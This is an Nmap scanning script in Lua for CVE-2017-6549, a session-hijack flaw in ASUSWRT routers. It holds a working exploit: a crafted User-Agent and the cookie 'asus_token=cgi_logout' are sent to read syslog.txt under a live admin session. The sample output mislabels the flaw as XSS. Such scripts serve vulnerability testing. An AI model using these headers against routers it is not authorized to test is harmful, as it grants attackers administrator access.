local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"
local nmap = require "nmap"

description = [[
ASUSWRT is a wireless router operating system that powers many routers produced by ASUS.

Session hijack vulnerability in httpd in ASUS ASUSWRT on RT-AC53 3.0.0.4.380.6038 devices
allows remote attackers to steal any active admin session by sending cgi_logout
and asusrouter-Windows-IFTTT-1.0 in certain HTTP headers.

If an attacker sets his cookie value to cgi_logout and puts
asusrouter-Windows-IFTTT-1.0 into his User-Agent header he will be treated
as signed-in if any other administrator session is active.

NOTE: This vulnerability is yet to be patched by the vendors.
]]

---
-- @usage
-- nmap --script http-asuswrt-session-hijacking <ip>
--
-- @args
-- http-asuswrt-session-hijacking.uri
--    Default: '/' (Preferred)
--
-- @output
-- PORT   STATE  SERVICE
-- 80/tcp open   http
-- |  http-asuswrt-session-hijacking
-- |    VULNERABLE:
-- |    XSS
-- |      State: VULNERABLE (Exploitable)
-- |      IDs:
-- |        CVE: CVE-2017-6549
-- |          Session hijack vulnerability in httpd in ASUS ASUSWRT on RT-AC53 3.0.0.4.380.6038 devices
-- |          allows remote attackers to steal any active admin session by sending cgi_logout
-- |          and asusrouter-Windows-IFTTT-1.0 in certain HTTP headers.
-- |
-- |          NOTE: This vulnerability is yet to be patched by the vendors.
-- |
-- |    References:
-- |      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-6549
--
---

author = "Rewanth Cool"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive", "exploit", "dos"}

portrule = shortport.port_or_service( {80, 443}, {"http", "https"}, "tcp", "open")

action = function(host, port)
  local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/"
  local file = "syslog.txt"

  local opt = {
    header = {
      ['User-Agent'] = "asusrouter-Windows-IFTTT-1.0",
      ['Cookie'] = "asus_token=cgi_logout"
    }
  }

  -- Exploiting the vulnerability
  local response = http.get( host, port, uri..file, opt )

  if( response.status == 200 ) then
    local vulnReport = vulns.Report:new(SCRIPT_NAME, host, port)
    local vuln = {
      title = "Session stealing vulnerability in httpd in ASUS ASUSWRT",
      state = vulns.STATE.EXPLOIT,
      description = [[
        Session hijack vulnerability in httpd in ASUS ASUSWRT on RT-AC53 3.0.0.4.380.6038 devices
        allows remote attackers to steal any active admin session by sending cgi_logout
        and asusrouter-Windows-IFTTT-1.0 in certain HTTP headers.

        NOTE: This vulnerability is yet to be patched by the vendors.
      ]],
      IDS = {
        CVE = "CVE-2017-6549",
        references = {
          "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-6549"
        },
        dates = {
          disclosure = {
            year = "2017",
            month = "03",
            day = "08"
          },
        }
      }
    }

    return vulnReport:make_output(vuln)
  end
end
